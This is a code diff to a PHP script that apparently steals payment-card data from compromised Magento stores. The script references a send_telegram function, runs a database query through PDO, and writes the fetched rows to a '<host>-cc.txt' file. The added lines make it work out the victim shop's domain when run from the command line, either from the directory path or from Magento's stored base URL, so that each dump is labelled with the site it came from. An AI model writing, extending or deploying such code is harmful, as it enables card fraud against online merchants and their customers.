@@ -62,7 +62,19 @@ function send_telegram($msg, $file_path = null) {
 }
 
 $host_name = php_uname('n');
-if (isset($_SERVER['HTTP_HOST'])) $host_name = $_SERVER['HTTP_HOST'];
+if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== 'localhost') {
+    $host_name = $_SERVER['HTTP_HOST'];
+} else {
+    // CLI Fallback: Try to find domain in the file path
+    $path_parts = explode('/', str_replace('\\', '/', __DIR__));
+    foreach (array_reverse($path_parts) as $p) {
+        // Look for something that looks like a domain (e.g., site.com)
+        if (preg_match('/^[a-z0-9.-]+\.[a-z]{2,10}$/i', $p)) {
+            $host_name = $p;
+            break;
+        }
+    }
+}
 
 $server_ip = gethostbyname($host_name);
 if (isset($_SERVER['SERVER_ADDR'])) $server_ip = $_SERVER['SERVER_ADDR'];
@@ -208,6 +220,27 @@ echo "Executing Query...\n";
 $stmt = $pdo->query($sql);
 $rows = $stmt->fetchAll();
 echo "Fetched " . count($rows) . " rows.\n";
+
+// ============================================
+// 5. DETERMINE FILENAME FROM DB (CLI Support)
+// ============================================
+$host_name = php_uname('n');
+if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== 'localhost') {
+    $host_name = $_SERVER['HTTP_HOST'];
+} else {
+    // Try to get from Magento Core Config
+    try {
+        $cfg_sql = "SELECT value FROM " . $prefix . "core_config_data WHERE path = 'web/unsecure/base_url' LIMIT 1";
+        $cfg_stmt = $pdo->query($cfg_sql);
+        $base_url = $cfg_stmt->fetchColumn();
+        if ($base_url) {
+            $parsed = parse_url($base_url);
+            if (isset($parsed['host'])) {
+                $host_name = $parsed['host'];
+            }
+        }
+    } catch (Exception $e) {}
+}
 
 $clean_host = preg_replace('/[^a-zA-Z0-9.-]/', '_', $host_name);
 $outFile = __DIR__ . '/' . $clean_host . '-cc.txt';
